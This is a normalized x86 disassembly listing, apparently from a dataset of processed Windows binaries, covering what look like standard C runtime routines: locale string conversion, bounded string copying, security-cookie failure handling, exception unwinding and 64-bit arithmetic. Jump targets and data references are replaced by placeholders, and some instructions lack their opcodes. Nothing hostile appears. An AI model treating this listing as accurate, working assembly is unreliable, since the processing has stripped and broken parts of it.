cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_410480
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40fd18
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_4104c7
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_40ba40
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40e940
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40d259
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40d9e0
cmp eax ebx
pop ecx
je r-xdata
call sub_410680
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_410033
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40fe7b
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_410073
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_40ba40
push [ esi + 0x8 ]
call sub_40ba40
push [ esi + 0xc ]
call sub_40ba40
push [ esi + 0x10 ]
call sub_40ba40
push [ esi + 0x14 ]
call sub_40ba40
push [ esi + 0x18 ]
call sub_40ba40
push [ esi ]
call sub_40ba40
push [ esi + 0x20 ]
call sub_40ba40
push [ esi + 0x24 ]
call sub_40ba40
push [ esi + 0x28 ]
call sub_40ba40
push [ esi + 0x2c ]
call sub_40ba40
push [ esi + 0x30 ]
call sub_40ba40
push [ esi + 0x34 ]
call sub_40ba40
push [ esi + 0x1c ]
call sub_40ba40
push [ esi + 0x38 ]
call sub_40ba40
push [ esi + 0x3c ]
call sub_40ba40
add esp 0x40
push [ esi + 0x40 ]
call sub_40ba40
push [ esi + 0x44 ]
call sub_40ba40
push [ esi + 0x48 ]
call sub_40ba40
push [ esi + 0x4c ]
call sub_40ba40
push [ esi + 0x50 ]
call sub_40ba40
push [ esi + 0x54 ]
call sub_40ba40
push [ esi + 0x58 ]
call sub_40ba40
push [ esi + 0x5c ]
call sub_40ba40
push [ esi + 0x60 ]
call sub_40ba40
push [ esi + 0x64 ]
call sub_40ba40
push [ esi + 0x68 ]
call sub_40ba40
push [ esi + 0x6c ]
call sub_40ba40
push [ esi + 0x70 ]
call sub_40ba40
push [ esi + 0x74 ]
call sub_40ba40
push [ esi + 0x78 ]
call sub_40ba40
push [ esi + 0x7c ]
call sub_40ba40
add esp 0x40
push [ esi + 0x80 ]
call sub_40ba40
push [ esi + 0x84 ]
call sub_40ba40
push [ esi + 0x88 ]
call sub_40ba40
push [ esi + 0x8c ]
call sub_40ba40
push [ esi + 0x90 ]
call sub_40ba40
push [ esi + 0x94 ]
call sub_40ba40
push [ esi + 0x98 ]
call sub_40ba40
push [ esi + 0x9c ]
call sub_40ba40
push [ esi + 0xa0 ]
call sub_40ba40
push [ esi + 0xa4 ]
call sub_40ba40
push [ esi + 0xa8 ]
call sub_40ba40
add esp 0x2c
sub_410203
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
push esi
call sub_40ba40
pop ecx
sub_410243
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_40ba40
pop ecx
push esi
call sub_40ba40
pop ecx
sub_4102cc
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_40d694
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_40d694
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
sub_410340
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_410386
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_40d694
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_40d694
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f5bf
add esp 0x14
mov eax esi
jmp r-xdata
sub_410440
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_410480
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_410db3
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40fd18
leave
retn
sub_4104c7
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40fd18
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_40e940
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_40d259
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_40d9e0
cmp eax edi
pop ecx
je r-xdata
call sub_410680
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_40dab0
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_40c248
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_40ba40
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_4106ac
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_40fa68
test eax eax
je r-xdata
push 0xa
call sub_40db86
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40fa75
pop ecx
push 0x3
call sub_40c61f
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40e940
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_41079f
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_40bd26
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x8 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
je r-xdata
push [ rw-data ]
call sub_40bd2f
cmp eax ebx
pop ecx
je r-xdata
push eax
call sub_40bd2f
cmp eax ebx
pop ecx
je r-xdata
push eax
call sub_40bd2f
push [ rw-data ]
mov esi eax
call sub_40bd2f
cmp esi ebx
pop ecx
pop ecx
mov edi eax
je r-xdata
push eax
call sub_40bcb8
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40bcb8
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_40bcb8
mov [ rw-data ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_40c427
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f4c3
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x8 ]
je r-xdata
call esi
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
push eax
call sub_40bcb8
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
push eax
call sub_40bd2f
cmp eax ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40c45e
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push r--data
push edi
call esi
push eax
call sub_40bcb8
pop ecx
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x10 ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40f4c3
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
sub_41095c
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_40d694
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40f5bf
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_4109a2
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_410a06
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_410a5d
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_410a5d
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_410a06
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_410afd
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40b00b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40d6dd
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_410b4c
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_410afd
pop ecx
pop ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
retn
sub_410b75
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_410aec
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_410aec
pop ecx
sub_410c7c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410c9c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40fd18
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_410ce1
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_410ce1
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_410c9c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_410d91
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_410db0
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_410d88
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_410d91
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_410dd0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_410e00
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_410ea0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_410ed4
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_40b00b
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_40d694
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40f5bf
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40d6dd
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
